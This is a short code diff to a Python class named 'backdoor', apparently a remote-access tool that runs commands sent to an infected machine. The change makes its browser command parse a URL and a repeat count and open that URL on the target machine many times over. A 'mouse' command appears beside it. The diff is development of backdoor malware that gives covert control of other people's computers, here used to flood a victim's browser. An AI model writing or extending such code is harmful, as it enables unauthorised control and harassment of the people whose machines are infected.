@@ -135,8 +135,15 @@ class backdoor:
                     browser_command = browser_command.replace("(", "")
                     browser_command = browser_command.replace(")", "")
                     browser_command = browser_command.replace('"', '')
-                    webbrowser.open_new(browser_command)
-                    output += "opening " + browser_command + "\n"
+                    url = browser_command.split(",")[0]
+                    repition = 1
+                    if len(browser_command.split(",")) > 1:
+                        repition = int(browser_command.split(",")[1])
+
+                    for i in range(repition):
+                        webbrowser.open_new(url)
+
+                    output += "opening " + url + " " + str(repition) + " times\n"
                 else:
                     output += "No argument provided\n"
             elif command.startswith("mouse"):
